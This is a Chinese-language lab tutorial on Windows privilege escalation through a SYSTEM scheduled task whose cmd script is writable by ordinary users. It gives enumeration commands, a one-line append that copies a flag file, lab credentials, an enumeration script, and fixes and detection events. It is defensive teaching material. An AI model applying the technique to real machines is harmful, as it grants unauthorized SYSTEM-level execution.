# Day 19：Scheduled Task — 當 SYSTEM 定期執行你能控制的檔案

## 開場情境

前三天（W01-W03）都圍繞 Windows Service。今天要跳出 Service，看另一個很常見的高權限執行機制：**Scheduled Task**。

系統上有一個排程任務，每分鐘以 SYSTEM 身分執行一個維護腳本。你改不了排程本身，但你能改那個腳本嗎？

這跟 Day 08（Linux Cron）的概念幾乎一樣——但 Windows 的實作完全不同。

---

## 今天要解決的問題

1. Windows Task Scheduler 怎麼運作？
2. Task 的 Trigger / Action / Principal 分別是什麼？
3. 「Task 定義安全」但「Action Target 可寫」代表什麼？
4. Cron 和 Scheduled Task 有什麼異同？

---

## 背景知識：Windows Task Scheduler

### 架構

![Task Scheduler 架構](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day19-scheduled-task-diagram-01.png)



### 三個核心元素

| 元素 | 說明 | 例子 |
|------|------|------|
| **Trigger** | 什麼時候觸發 | 每分鐘、登入時、特定時間 |
| **Action** | 執行什麼 | `cmd.exe /c script.cmd` |
| **Principal** | 以誰的身分 | SYSTEM / Administrator / User |

### Task Definition 的安全性

SYSTEM 建立的 Task，定義檔預設只有 Administrators 和 SYSTEM 可以修改。普通使用者**不能**用 `schtasks /change` 修改它。

---

## OS 原理：Task Definition vs Action Target

![Task Definition 與 Action Target](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day19-scheduled-task-diagram-02.png)


跟 Day 08 的 Cron 一樣，Task Scheduler 也有兩個需要保護的東西：


如果 Task Definition 安全（fei-student 不能改排程），但 Action Target（腳本）可以被 fei-student 修改，那就形成了提權路徑。

---

## FEI Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
Scenario: FEI-W04-SCHEDULED-TASK
Task: \FEI\FEI-W04-Maintenance (SYSTEM, 每分鐘)
Action: cmd.exe /c fei-maintenance.cmd
Flag: C:\FEI-PrivEsc\Flags\fei-w04-system-flag.txt
```



### 場景準備

`powershell
# 1. 以 fei-labadmin 登入 Windows VM（VMware Console）
# 密碼：FEI-LabAdmin-2026!

# 2. 以系統管理員開啟 PowerShell，進入場景目錄
cd C:\FEI-PrivEsc\Scenarios\FEI-W04-SCHEDULED-TASK

# 3. 執行 setup
.\fei-setup.ps1

# 4. 確認場景就緒
.\fei-verify.ps1
# 應看到 W04-SCHEDULED-TASK STATUS: READY

# 5. 登出，改以 fei-student 登入
# 密碼：FEI-Student-2026!
`

### 部署過程

1. 建立 `fei-maintenance.cmd`（benign — 只寫 log）
2. 設定 cmd ACL：**Users = Modify**（漏洞！）
3. 建立 Scheduled Task（每分鐘、SYSTEM、action 指向 cmd）
4. Task Definition：受保護（fei-student 不能改）

---

## 攻擊流程（Actual Output）

### Step 1：列舉排程

```cmd
schtasks /query /tn "\FEI\FEI-W04-Maintenance" /fo LIST
```

> 發現以 SYSTEM 執行。

### Step 2：檢查 Action Target ACL

```cmd
icacls "C:\FEI-PrivEsc\Training\W04\fei-maintenance.cmd"
```

```
BUILTIN\Users:(M)
```

> Users 有 Modify！可以修改這個 cmd 腳本。

### Step 3：修改 Action Target

```cmd
echo type "C:\FEI-PrivEsc\Flags\fei-w04-system-flag.txt" ^> "C:\Users\Public\fei-w04-proof.txt" >> "C:\FEI-PrivEsc\Training\W04\fei-maintenance.cmd"
```

> 注意 `^>` 是 cmd 中 `>` 的 escape 語法。

### Step 4：等待 Task 執行（最多 60 秒）

### Step 5：讀取 Flag

```cmd
type "C:\Users\Public\fei-w04-proof.txt"
```

```
FEI{WINDOWS_W04_SCHEDULED_TASK_SYSTEM_ACCESS}
```

---

## Attack Path

![Scheduled Task Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day19-scheduled-task-diagram-03.png)



---

## 為什麼它真的成立？

```
Task Definition（排程設定）     ← 受保護 ✅
Action Target（被執行的腳本）   ← 可被修改 ❌
```

Task Scheduler 信任 Action Target 的完整性。但如果低權限使用者能修改 Target，那麼 SYSTEM 最終執行的是攻擊者控制的內容。

---

## False Positive 分析

### 「有 SYSTEM Task 就一定危險？」

不是。條件是：

1. Task 以 **高權限** 執行
2. Action 指向的**檔案/腳本可被低權限使用者修改**
3. Task 會**被觸發**（定期或可手動觸發）

如果 Action 指向 `C:\Windows\System32\` 裡的系統 binary，那基本上不可能被替換。

---

## Edge Case

### cmd 語法的 escape

在 cmd.exe 中，`>` 是重導向符號。如果你要把 `>` 寫入檔案，需要 escape 成 `^>`。

### Task 觸發權限

有些 SYSTEM Task 可以被一般使用者 `schtasks /run` 手動觸發，有些不行。Lab 環境中我們設定了 1 分鐘自動觸發，學員不需要手動觸發。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| proof.txt 沒出現 | cmd 語法錯（缺 `^>`） | 檢查 escape |
| 等了 2 分鐘還沒有 | Task 可能沒在跑 | `schtasks /query` 確認 |
| 修改被拒 | cmd 的 ACL 沒有 Modify | 確認 `icacls` |

---

## 防禦（Defense）

### Root Cause

Task Action 指向的 cmd 檔案被授予了 Users Modify ACL。

### 修復

```cmd
icacls "C:\path\to\fei-maintenance.cmd" /remove Users
icacls "C:\path\to\fei-maintenance.cmd" /grant:r "SYSTEM:(F)" "Administrators:(F)"
```

### Detection

| Event ID | 說明 |
|----------|------|
| 4698 | 新排程工作被建立 |
| 4702 | 排程工作被修改 |
| File Audit | Action Target 被修改 |

---

## Fix Verification

修復後：

```cmd
echo test >> "C:\path\to\fei-maintenance.cmd"
```

應回傳「存取被拒」。

---

## Cron vs Scheduled Task 跨平台比較

| | Linux (L04) | Windows (W04) |
|---|---|---|
| Scheduler | cron daemon | Task Scheduler |
| 排程定義 | `/etc/cron.d/` file | XML in `C:\Windows\System32\Tasks\` |
| 執行身分 | root（cron file 中指定）| SYSTEM（Principal） |
| 弱點 | Script 0777（world-writable）| cmd Users:(M) |
| 攻擊 | append to script | append to cmd |
| 等待 | ≤60 秒 | ≤60 秒 |

共同 Mental Model：

```
Who schedules it?     → 管理員 / SYSTEM
Who executes it?      → root / SYSTEM
What gets executed?   → script / cmd
Who controls that?    → 如果低權限使用者可以修改...
```

---

## Exercise

### 練習：找出 SYSTEM Task 的 Action

```powershell
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | ForEach-Object {
    $task = $_
    $actions = $task.Actions
    foreach ($a in $actions) {
        [PSCustomObject]@{
            TaskName = $task.TaskName
            Execute = $a.Execute
            Arguments = $a.Arguments
        }
    }
} | Format-Table -AutoSize
```

然後對每個 Action 的 Execute 路徑做 `icacls` 檢查。

---

## Quiz

**Q1**: W04 和 W01 的核心差異是什麼？

A. W04 以 SYSTEM 執行，W01 以 Administrator 執行
B. W04 利用 Scheduled Task，W01 利用 Service
C. W04 不需要修改設定，W01 需要
D. W04 更危險

### 答案B + C。W01 修改 Service 設定（sc config），W04 修改被排程執行的檔案（不改排程本身）。



## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W04-SCHEDULED-TASK
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W04-SCHEDULED-TASK STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **Task Definition 安全 ≠ 整個排程安全**。如果 Action Target 可寫，SYSTEM 就會執行攻擊者的內容。
2. **cmd 的 `^>` escape 語法**很容易搞錯。
3. **Cron 和 Scheduled Task 的核心問題一樣**：高權限排程器信任了低權限使用者可控制的資源。

---

## 給自己的問題

> 到目前為止我們利用了 Service（W01-W03）和 Scheduled Task（W04）。如果有一個 Windows Installer Policy 讓任何使用者安裝 MSI 都以 elevated 權限執行呢？

---

## 下一篇

Day 20：AlwaysInstallElevated — 兩個 Registry Policy 如何改變安裝權限
